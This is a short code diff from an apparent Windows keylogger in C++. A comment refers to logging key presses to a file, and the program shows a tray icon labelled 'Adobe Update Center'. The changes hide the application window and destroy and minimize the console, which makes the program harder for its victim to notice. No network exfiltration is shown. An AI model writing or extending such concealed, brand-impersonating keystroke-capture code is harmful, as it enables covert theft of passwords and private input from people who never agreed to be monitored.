@@ -11,7 +11,7 @@ NOTIFYICONDATA nid;
 
 void HideConsole()
 {
-    ::ShowWindow(::GetConsoleWindow(), SW_FORCEMINIMIZE);
+    ::ShowWindow(::GetConsoleWindow(), SW_MINIMIZE);
 }
 
 // Function to handle key press and write to log file
@@ -74,13 +74,14 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             notifyIconData.uID = 1;
             notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
             notifyIconData.uCallbackMessage = WM_USER + 1;
-//            notifyIconData.hIcon = LoadIcon(nullptr, IDI_WARNING);
             notifyIconData.hIcon = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 32, 32, LR_LOADFROMFILE);
             lstrcpy(notifyIconData.szTip, "Adobe Update Center");
             Shell_NotifyIcon(NIM_ADD, &notifyIconData);
-            HideConsole();
+
             // Minimize the window
             ShowWindow(hwnd, SW_HIDE);
+            DestroyWindow(::GetConsoleWindow());
+            HideConsole();
             break;
         }
 
